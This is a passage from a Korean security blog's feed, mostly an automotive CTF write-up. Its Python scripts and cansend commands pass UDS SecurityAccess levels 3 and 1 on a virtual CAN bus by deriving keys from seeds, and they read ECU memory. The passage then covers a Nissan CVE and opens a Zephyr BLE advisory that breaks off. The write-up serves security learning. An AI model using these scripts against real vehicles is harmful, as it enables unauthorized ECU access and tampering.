&#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; &#xAC12;&#xC5D0; +1&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xC694;&#xCCAD;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image23.png" alt="image23.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(PCI:len) 27(SID:SecurityAccess) 03(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022703</span><span class="hljs-comment"># 04(PCI:len) 27(SID:SecurityAccess) 04(Level+1) KEYS</span>cansend vcan0 7E0<span class="hljs-comment">#042704KEYS</span></code></pre><p>&#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xC778;&#xC99D; &#xC2DC;&#xD000;&#xC2A4;&#xC5D0; &#xB530;&#xB77C;&#xC11C; &#xB808;&#xBCA8; 3&#xC5D0; &#xB300;&#xD55C; &#xC778;&#xC99D;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC6B0;&#xC120; &#xC9C4;&#xB2E8; &#xD655;&#xC7A5; &#xC138;&#xC158;(<code>1030</code>)&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD55C; &#xC774;&#xD6C4;, &#xBCF4;&#xC548; &#xC5D1;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 3(<code>2703</code>) &#xC694;&#xCCAD;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; <code>7E53</code>&#xC774;&#xB77C;&#xB294; seed &#xAC12;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; key &#xAC12;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; RSID(<code>67</code>)&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74;&#xC11C;, &#xBCF4;&#xC548; &#xC5D1;&#xC138;&#xC2A4;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; seed &#xAC12;&#xC744; &#xBE44;&#xD2B8; &#xBC18;&#xC804;&#xD558;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; flag&#xB294; <code>0x1337 ^ 0xFFFF</code>&#xB97C; &#xD55C; &#xACB0;&#xACFC;&#xB85C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"> <span class="hljs-comment"># security access level 3 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x03\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    seed = msg_data.hex()[<span class="hljs-number">6</span>:<span class="hljs-number">10</span>]    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed}</span>&quot;</span>)        key = <span class="hljs-string">f&quot;<span class="hljs-subst">{~int(seed, <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>:<span class="hljs-number">04</span>X}</span>&quot;</span>    print(<span class="hljs-string">f&quot;Keys: <span class="hljs-subst">{key}</span>&quot;</span>)        key_bytes = int(key, <span class="hljs-number">16</span>).to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x04\x27\x04&quot;</span> + key_bytes + <span class="hljs-string">b&quot;\x00\x00\x00&quot;</span>    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>        print(<span class="hljs-string">&quot;Security access level 3 unlock!&quot;</span>)</code></pre><p><img src="image24.png" alt="image24.png"></p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; seed &#xAC12; &#xD655;&#xC778; &#xC774;&#xD6C4;&#xC5D0; &#xB9E4;&#xC6B0; &#xC9E7;&#xC740; &#xC2DC;&#xAC04;&#xC5D0; &#xC5F0;&#xC0B0;&#xD55C; key &#xAC12;&#xC744; &#xC804;&#xC1A1;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC704;&#xCC98;&#xB7FC; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAD8C;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;(&#xBB3C;&#xB860; &#xC190;&#xC774; &#xBE60;&#xB974;&#xB2E4;&#xBA74; &#xC9C1;&#xC811; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;).</p><h3 id="3-6-Security-Access-Level-1"><a href="#3-6-Security-Access-Level-1" class="headerlink" title="3.6. Security Access Level 1"></a>3.6. Security Access Level 1</h3><p><img src="image25.png" alt="image25.png"></p><p>&#xC774;&#xBC88; &#xBB38;&#xC81C;&#xB294; <code>0x1A000</code> &#xB300;&#xC5ED; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30;&#xB97C; &#xD1B5;&#xD574; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1 &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC54C;&#xC544;&#xB0B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. flag&#xB294; 0x7D0E1A5C&#xAC00; seed&#xC77C; &#xB54C;&#xC758; key &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xB808;&#xBCA8; 1&#xC758; seed &#xAC12;&#xACFC; key &#xAC12;&#xC758; &#xAE38;&#xC774;&#xB294; 4 byte&#xC778; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD76C;&#xD55C;&#xD558;&#xAC8C; UDS Challenge&#xC5D0;&#xC11C;&#xB294; &#xB808;&#xBCA8; 1&#xC774; &#xB808;&#xBCA8; 3&#xBCF4;&#xB2E4; &#xB4A4;&#xC5D0; &#xBC30;&#xCE58;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># read memory</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, dlc, datarecvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    can_id_filter = <span class="hljs-number">0x7E8</span>    can_mask_filter = <span class="hljs-number">0xFFF</span>    can_filter = struct.pack(<span class="hljs-string">&quot;=II&quot;</span>, can_id_filter, can_mask_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, can_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_RECV_OWN_MSGS, <span class="hljs-number">0</span>)    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    <span class="hljs-keyword">for</span> hex_value <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x1A000</span>, <span class="hljs-number">0x1B000</span>, <span class="hljs-number">0xFF</span>):        candata = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + hex_value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>                data1 = <span class="hljs-string">b&quot;\x02\x10\x02\x00\x00\x00\x00\x00&quot;</span>        frame1 = build_can_frame(<span class="hljs-number">0x7DF</span>, data1)        p.send(frame1)                frame_r1 = p.recv(<span class="hljs-number">16</span>)                frame2 = build_can_frame(<span class="hljs-number">0x7DF</span>, candata)        p.send(frame2)                frame_r2 = p.recv(<span class="hljs-number">16</span>)        can_id2, dlc2, data_r2 = dissect_can_frame(frame_r2)                recvdata += data_r2.hex()[<span class="hljs-number">6</span>:]                data3 = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)        p.send(frame3)                temp = <span class="hljs-number">0</span>        <span class="hljs-keyword">while</span> temp &lt; <span class="hljs-number">36</span>:            frame_r_loop = p.recv(<span class="hljs-number">16</span>)            can_id_loop, dlc_loop, data_loop = dissect_can_frame(frame_r_loop)                        tempdata = data_loop.hex()[<span class="hljs-number">2</span>:]                        <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                recvdata += tempdata            temp = temp + <span class="hljs-number">1</span>print(<span class="hljs-string">f&quot;recv data: <span class="hljs-subst">{recvdata}</span>&quot;</span>)</code></pre><p>&#xBA3C;&#xC800;, <code>0x1A000</code> &#xB300;&#xC5ED; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30;&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="image26.png" alt="image26.png"></p><p>&#xC774;&#xC804;&#xC5D0; &#xB808;&#xBCA8; 3&#xB97C; &#xC778;&#xC99D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xBA3C;&#xC800; &#xC2E4;&#xD589;&#xD574;&#xC11C; &#xB808;&#xBCA8; 3 &#xC778;&#xC99D;&#xC744; &#xD1B5;&#xACFC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8; &#xC774;&#xD6C4;&#xC5D0; &#xBC29;&#xAE08; &#xC791;&#xC131;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;, 4 byte &#xAC12;&#xC774; 2&#xBC88; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAC12;&#xC740; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1 &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; seed &#xAC12;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xB2EC;&#xB77C;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x983cb51b</span> ^ <span class="hljs-number">0xcd051f0c</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0xddee9870</span> ^ <span class="hljs-number">0x88d73267</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x4a4499ad</span> ^ <span class="hljs-number">0x1f7d33ba</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span></code></pre><p>&#xD574;&#xB2F9; &#xAC12;&#xB4E4;&#xC744; XOR &#xC5F0;&#xC0B0;&#xC744; &#xD558;&#xBA74; <code>0x5539aa17</code>&#xC774;&#xB77C;&#xB294; &#xACE0;&#xC815;&#xC801;&#xC778; &#xAC12;&#xC774; &#xB098;&#xC624;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; seed &#xAC12;&#xACFC; &#xC5F0;&#xC0B0;&#xD55C; key &#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC5F0;&#xC0B0; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; <code>seed ^ 0x5539aa17</code>&#xC774;&#xB77C;&#xB294; &#xAC83; &#xC5ED;&#xC2DC; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image28.png" alt="image27.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(PCI:len) 27(SID:SecurityAccess) 01(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022701</span><span class="hljs-comment"># 06(PCI:len) 27(SID:SecurityAccess) 02(Level+1) KEYSKEYS</span>cansend vcan0 7E0<span class="hljs-comment">#062702KEYSKEYS</span></code></pre><p>&#xC54C;&#xC544;&#xB0B8; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1 &#xC778;&#xC99D;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;, RSID(<code>67</code>)&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA70; &#xC131;&#xACF5;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># security access level 1 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x01\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    seed_bytes = msg_data[<span class="hljs-number">3</span>:<span class="hljs-number">7</span>]    seed_int = int.from_bytes(seed_bytes, <span class="hljs-string">&apos;big&apos;</span>)    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_int = seed_int ^ <span class="hljs-number">0x5539AA17</span>    print(<span class="hljs-string">f&quot;Key: <span class="hljs-subst">{key_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_bytes = key_int.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x06\x27\x02&quot;</span> + key_bytes    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    print(<span class="hljs-string">&quot;Security access level 1 unlock!&quot;</span>)</code></pre><p><img src="image28.png" alt="image28.png"></p><p>&#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1&#xC744; &#xD574;&#xC81C;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB3C4; &#xC5ED;&#xC2DC; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image29.jpg" alt="image29.jpg"></p><h2 id="4-UDS-&#xBA85;&#xB839;&#xC5B4;&#xB85C;-&#xBC1C;&#xC0DD;&#xD558;&#xB294;-CVE"><a href="#4-UDS-&#xBA85;&#xB839;&#xC5B4;&#xB85C;-&#xBC1C;&#xC0DD;&#xD558;&#xB294;-CVE" class="headerlink" title="4. UDS &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; CVE"></a>4. UDS &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; CVE</h2><p><img src="image30.jpg" alt="image30.jpg"></p><p>BlockHarbor CTF&#xB85C; &#xBC30;&#xC6B4; UDS &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xC2E4;&#xC81C;&#xB85C; CVE&#xAC00; &#xBC1C;&#xAE09;&#xC774; &#xB418;&#xB294; &#xC0AC;&#xB840;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB300;&#xD45C;&#xC801;&#xC73C;&#xB85C; Nissan Altima&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6347">CVE-2024-6347</a>&#xC785;&#xB2C8;&#xB2E4;.</p><p>CVE-2024-6347&#xB294; UDS &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD55C; DoS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xC0AC;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. &#xC0AC;&#xAC01;&#xC9C0;&#xB300; &#xAC10;&#xC9C0; &#xC13C;&#xC11C; ECU &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0; ECU &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC138;&#xC158;&#xC73C;&#xB85C; &#xBB34;&#xB2E8; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; DoS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; CAN/UDS&#xB97C; &#xD1B5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC2DD;&#xBCC4;&#xC790; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>22</code>)&#xACFC; &#xB2E4;&#xC591;&#xD55C; &#xC9C4;&#xB2E8; &#xC694;&#xCCAD;(<code>19</code> &#xB4F1;)&#xC744; &#xD1B5;&#xD55C; Information Leak, &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4;(<code>27</code>) &#xC6B0;&#xD68C;&#xB97C; &#xD1B5;&#xD55C; ECU &#xBC0F; &#xCC28;&#xB7C9; &#xB0B4;&#xBD80; &#xAD8C;&#xD55C; &#xD0C8;&#xCDE8; &#xB4F1;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788;, &#xC8FC;&#xC18C; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>23</code>)&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBBF8;&#xD761;&#xD558;&#xBA74;, &#xB0B4;&#xBD80; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC73C;&#xB85C; &#xD38C;&#xC6E8;&#xC5B4;&#xAC00; &#xC720;&#xCD9C; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xC5C4;&#xBC00;&#xD55C; &#xAC80;&#xC99D;&#xACFC; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4;&#xC758; &#xC811;&#xADFC; &#xC81C;&#xC5B4;&#xAC00; &#xCC28;&#xB7C9; &#xBCF4;&#xC548;&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC694;&#xC18C;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/CAN/">CAN</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/UDS/">UDS</category>
      
      <category domain="https://hackyboiz.github.io/tags/VSEC/">VSEC</category>
      
      <category domain="https://hackyboiz.github.io/tags/automotive/">automotive</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockharbor/">blockharbor</category>
      
      <category domain="https://hackyboiz.github.io/tags/car/">car</category>
      
      <category domain="https://hackyboiz.github.io/tags/vehicle/">vehicle</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-10456 : Zephyr RTOS의 BLE의 검증 미흡으로 인한 DoS</title>
      <link>https://hackyboiz.github.io/2025/11/19/poosic/cve-2025-10456/</link>
      <guid>https://hackyboiz.github.io/2025/11/19/poosic/cve-2025-10456/</guid>
      <pubDate>Wed, 19 Nov 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-10456&quot;&gt;NV</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-10456">NVD: CVE-2025-10456</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Zephyr RTOS&#xC758; BLE &lt;= v4.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-10456&#xC740; Zephyr RTOS&#xC758; BLE(Bluetooth Low Energy)&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; DoS &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Bluetooth &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xC2A4;&#xD0DD; &#xC0C1;&#xC5D0;&#xC11C; &#xBB3C;&#xB9AC;&#xACC4;&#xCE35;&#xACFC; &#xADF8; &#xC0C1;&#xC704;&#xACC4;&#xCE35; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; L2CAP &#xACC4;&#xCE35;&#xC5D0;&#xC11C; integer overflow&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xCF54;&#xB4DC;&#xB85C; &#xBD80;&#xD130; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xC778;&#xC774; &#xB41C; &#xCF54;&#xB4DC;&#xB294; BLE&#xC758; L2CAP &#xCC98;&#xB9AC; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Bluetooth&#xC5D0;&#xC11C;&#xB294; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; BLE&#xC5D0;&#xC11C;&#xB9CC; &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; 